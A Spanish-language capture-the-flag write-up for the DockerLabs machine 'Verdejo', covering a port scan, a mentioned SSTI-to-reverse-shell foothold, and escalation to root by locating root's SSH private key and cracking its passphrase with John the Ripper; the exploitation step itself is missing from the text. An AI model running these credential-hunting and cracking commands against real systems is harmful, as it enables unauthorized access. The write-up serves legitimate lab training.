## Introducción

Este documento presenta la resolución completa de la máquina **Verdejo**, desarrollada por *The Hacker Labs* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
El laboratorio expone un servidor web en el puerto 8089 con un formulario vulnerable a **Server-Side Template Injection (SSTI)**, permitiendo la ejecución remota de comandos y obteniendo una reverse shell como el usuario `verde`.
Una vez dentro, se identifica una configuración insegura que permite leer archivos con `sudo` y se encuentra una clave privada SSH de `root` protegida con contraseña. Tras crackear la contraseña con John the Ripper, se accede al sistema como `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Verdejo.zip
sudo bash auto_deplo.sh Verdejo.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748411786/ipScan_skcisu.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Verdejo/{content,exploits,nmap,scripts}
cd Verdejo
```

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **80/tcp** — HTTP
* **8089/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1751517490/Ports_uebgnb.png)

## Paso 3 — Escalada de privilegios

### 3.1 De verde → root

Se verifican los permisos sudo:

```bash
sudo -l
```

![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1751517604/Sudo-L_yk7tic.png)

Se busca una clave privada SSH de `root`:

```bash
find / -name "id_rsa" 2>/dev/null
```

Si la clave está protegida por contraseña, se crackea con John the Ripper:

```bash
ssh2john id_rsa > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![John](https://res.cloudinary.com/dewqswzke/image/upload/v1751517439/John_enbjo8.png)

Se accede como `root`:

```bash
ssh -i id_rsa root@172.17.0.2
```

![SSH Root](https://res.cloudinary.com/dewqswzke/image/upload/v1751517601/SSHRoot_gdjmdg.png)
